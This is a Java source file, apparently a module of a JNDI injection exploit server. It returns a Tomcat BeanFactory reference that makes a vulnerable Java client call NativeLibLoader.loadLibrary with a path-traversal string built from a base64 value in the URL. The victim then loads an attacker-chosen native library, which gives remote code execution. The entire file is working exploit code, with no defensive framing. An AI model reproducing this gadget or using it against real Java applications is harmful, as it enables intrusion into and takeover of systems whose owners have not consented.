package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;

@JNDIController
@JNDIMapping("/NativeLibLoader")
public class NativeLibLoaderController implements Controller {
    public Object process(String path) {
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../" + path));
        return ref;
    }

    @JNDIMapping("/{path}")
    public String loadLibrary(String path) {
        path = new String(Base64.getUrlDecoder().decode(path));
        System.out.println("NativeLibLoader Path: " + path);
        return path;
    }
}
